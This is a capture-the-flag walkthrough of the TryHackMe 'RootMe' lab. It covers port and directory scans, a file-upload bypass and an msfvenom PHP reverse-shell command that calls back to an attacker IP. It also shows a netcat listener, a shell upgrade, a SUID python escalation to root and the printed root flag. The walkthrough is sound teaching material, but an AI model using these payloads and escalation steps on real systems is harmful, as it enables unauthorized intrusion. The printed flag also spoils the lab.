#   Tryhackme - rootme
##  Walkthrough by
```
Shaswata Saha
08-07-2023
12:44AM
```
### [Demo](https://infosecwriteups.com/tryhackme-rootme-ctf-walkthrough-detailed-a7c521df7339)

##  IP = 10.10.72.228

##  Steps:

1.  nmap scan
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-07 15:16 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:16
Completed NSE at 15:16, 0.00s elapsed
Initiating NSE at 15:16
Completed NSE at 15:16, 0.00s elapsed
Initiating NSE at 15:16
Completed NSE at 15:16, 0.00s elapsed
Initiating Ping Scan at 15:16
Scanning 10.10.72.228 [2 ports]
Completed Ping Scan at 15:16, 0.32s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:16
Completed Parallel DNS resolution of 1 host. at 15:16, 0.33s elapsed
Initiating Connect Scan at 15:16
Scanning 10.10.72.228 [1000 ports]
Discovered open port 22/tcp on 10.10.72.228
Discovered open port 80/tcp on 10.10.72.228
Increasing send delay for 10.10.72.228 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.72.228 from 5 to 10 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.72.228 from 10 to 20 due to 11 out of 13 dropped probes since last increase.
Increasing send delay for 10.10.72.228 from 20 to 40 due to 11 out of 21 dropped probes since last increase.
Completed Connect Scan at 15:17, 54.13s elapsed (1000 total ports)
Initiating Service scan at 15:17
Scanning 2 services on 10.10.72.228
Completed Service scan at 15:17, 6.57s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.72.228.
Initiating NSE at 15:17
Completed NSE at 15:17, 9.51s elapsed
Initiating NSE at 15:17
Completed NSE at 15:17, 0.85s elapsed
Initiating NSE at 15:17
Completed NSE at 15:17, 0.00s elapsed
Nmap scan report for 10.10.72.228
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 15:17
Completed NSE at 15:17, 0.00s elapsed
Initiating NSE at 15:17
Completed NSE at 15:17, 0.00s elapsed
Initiating NSE at 15:17
Completed NSE at 15:17, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.44 seconds

```

2.  gobuster scan
```bash
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.72.228
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                Documents/gobuster-wordlist/dsstorewordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/07 15:17:18 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 616]
/js                   (Status: 301) [Size: 309] [--> http://10.10.72.228/js/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.72.228/css/]
/.htaccess            (Status: 403) [Size: 277]
/uploads              (Status: 301) [Size: 314] [--> http://10.10.72.228/uploads/]
/panel                (Status: 301) [Size: 312] [--> http://10.10.72.228/panel/]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswds           (Status: 403) [Size: 277]
Progress: 1735 / 1829 (94.86%)[ERROR] 2023/07/07 15:18:04 [!] Get "http://10.10.72.228/player.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 1825 / 1829 (99.78%)
===============================================================
2023/07/07 15:18:07 Finished
===============================================================

```

4.  We find the /panel/ to be vulnerable

5.  We find a shell. Now we want to escalate privileges:
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.17.28.202 LPORT=4444 -f raw > shell.php
```
Cannot upload..!

6.  We can upload a file in the /panel/ directory.

For this task we will upload php reverse shell script. I frequently use pentestmonkey php-reverse-shell.php script to try to gain a reverse shell using netcat.
Git Link to download the script or clone in terminal : https://github.com/pentestmonkey/php-reverse-shell

7.  Open the script in editor and change the $ip and $port to your host machine’s IP and port you want to listen on.

8.  Listen on netcat
```bash
──(subhro1530㉿subhro)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...

```

9.  Go to <IP>/uploads/. Here you will find the uploaded reverse shell file. Click on it and the netcat will open up a shell.

10. Get the user.txt file:
```bash
find / -type f -name user.txt
```

11. We find it to be inside /var/www/user.txt. Cat that..!

12. Now for privilege escalation, stabilizze the shell using python:
```bash
python -c "import pty;pty.spawn('/bin/bash')"
```

We get the perfect terminal:

```bash
bash-4.4$ 
```

13. To look for the files with SUID permission we can use the command:
```bash
find / -type f -user root -perm -4000 2>/dev/null
```
We find the _/usr/bin/python_ to have SUID permission. It can be accessed as root.
This is suspicious..!

14. Gain access of root:
[link](https://gtfobins.github.io/gtfobins/python/)
```bash
python -c "import os; os.execl('/bin/sh', 'sh', '-p')"
```
We are root..!!

15. 
```bash
# cd /root
cd /root
# ls
ls
root.txt
# cat root.txt
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

We hacked the IP...!